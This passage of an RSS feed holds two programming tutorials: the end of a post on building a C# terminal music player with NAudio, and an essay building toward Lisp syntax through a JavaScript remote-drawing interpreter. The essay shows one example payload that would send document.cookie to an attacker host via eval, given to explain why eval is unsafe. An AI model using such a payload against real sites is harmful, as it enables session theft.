        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" width="750" height="446" alt="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" width="750" height="446" alt="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" width="750" height="473" alt="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

      </article></div>]]>
            </description>
            <link>https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892637</guid>
            <pubDate>Mon, 26 Oct 2020 03:42:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Intuition for Lisp Syntax]]>
            </title>
            <description>
<![CDATA[
Score 538 | Comments 193 (<a href="https://news.ycombinator.com/item?id=24892297">thread link</a>) | @simonpure
<br/>
October 25, 2020 | https://stopa.io/post/265 | <a href="https://web.archive.org/web/*/https://stopa.io/post/265">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>// same as</span>
<span>[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]]]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>"do"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>do</span><span>: (</span><span>...</span><span>args</span><span>) </span><span>=&gt;</span><span> </span><span>args</span><span>[</span><span>args</span><span>.length </span><span>-</span><span> </span><span>1</span><span>],</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"drawPoint"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }],</span>
<span>  [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]],</span>
<span>];</span></code></pre><p>Let’s make it more interesting. What if we wanted to support <em>definitions?</em></p><pre><code><span>const</span><span> </span><span>shape</span><span> </span><span>=</span><span> </span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span></code></pre><p>If we could support definitions, our remote user could write some very expressive instructions! Let’s convert our code to the kind of data structure we’ve been playing with:</p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span>
<span>[</span><span>"rotate"</span><span>, </span><span>"shape"</span><span>, </span><span>90</span><span>]</span></code></pre><p>Noot bad! If we can support an instruction like that, we’d be golden! Here’s how: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>variables</span><span> </span><span>=</span><span> {};</span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>def</span><span>: (</span><span>name</span><span>, </span><span>v</span><span>) </span><span>=&gt;</span><span> {</span>
<span>      </span><span>variables</span><span>[</span><span>name</span><span>] </span><span>=</span><span> </span><span>v</span><span>;</span>
<span>    },</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>variables</span><span>[</span><span>ins</span><span>]) {</span>
<span>      </span><span>// this must be some kind of variable, like "shape"</span>
<span>      </span><span>return</span><span> </span><span>variables</span><span>[</span><span>ins</span><span>];</span>
<span>    }</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Here, we introduced a <code>variables</code> object, which keeps track of every variable we define.  A special <code>def</code> function updates that <code>variables</code> object. Now we can run this instruction: </p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>  [</span><span>"rotate"</span><span>, </span><span>"shape"</span><span>, </span><span>90</span><span>],</span>
<span>];</span></code></pre><p>Not bad!</p><p>Let’s step it up a notch. What if we let our remote user <em>define their own functions?</em> </p><p>Say they wanted to write something like this:</p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) { </span>
<span>   </span><span>drawLine</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>color</span><span>);</span>
<span>   </span><span>drawLine</span><span>(</span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>); </span>
<span>   </span><span>drawLine</span><span>(</span><span>left</span><span>, </span><span>right</span><span>, </span><span>color</span><span>); </span>
<span>} </span>
<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again. If we transcribe this to our data representation, here’s how it could look:</p><pre><code><span>  [</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>,</span>
<span>  [</span><span>"fn"</span><span>, [</span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>    [</span><span>"do"</span><span>,</span>
<span>      [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>      [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>    ],</span>
<span>  ],</span>
<span>],</span>
<span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>],</span></code></pre><p>Here, </p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>...</span></code></pre><p>translates to </p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>, …]. </span></code></pre><p>And</p><pre><code><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) {…}</span></code></pre><p>translates to </p><pre><code><span>[</span><span>"fn"</span><span>, [</span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>], [</span><span>"do"</span><span> </span><span>...</span><span>]]</span></code></pre><p>All we need to do is to parse this instruction somehow, and bam, we are good to go!</p><p>The key to making this work is our <code>["fn", …]</code> instruction. What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>      </span><span>...</span><span>oldVariables</span><span>,</span>
<span>      </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>),</span>
<span>    };</span>
<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>
<span>  left: { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, </span>
<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>"blue"</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>"do"</span><span>,</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>if</span><span> (</span><span>fName</span><span> </span><span>==</span><span> </span><span>"fn"</span><span>) {</span>
<span>      </span><span>return</span><span> </span><span>parseFnInstruction</span><span>(</span><span>...</span><span>args</span><span>, </span><span>variables</span><span>);</span>
<span>    }</span>
<span>    </span><span>...</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Now, our <code>parseFnInstruction</code>: </p><pre><code><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> { </span>
<span>  </span><span>return</span><span> </span><span>args</span><span>.reduce</span><span>((</span><span>res</span><span>, </span><span>k</span><span>, </span><span>idx</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>res</span><span>[</span><span>k</span><span>] </span><span>=</span><span> </span><span>values</span><span>[</span><span>idx</span><span>];</span>
<span>    </span><span>return</span><span> </span><span>res</span><span>;</span>
<span>  }, {});</span>
<span>}</span>
<span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span>
<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>It works exactly like we …</p></span></p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stopa.io/post/265">https://stopa.io/post/265</a></em></p>]]>
            </description>
            <link>https://stopa.io/post/265</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892297</guid>
            <pubDate>Mon, 26 Oct 2020 02:26:54 GMT</pubDate>
        </item>
    </channel>
</rss>
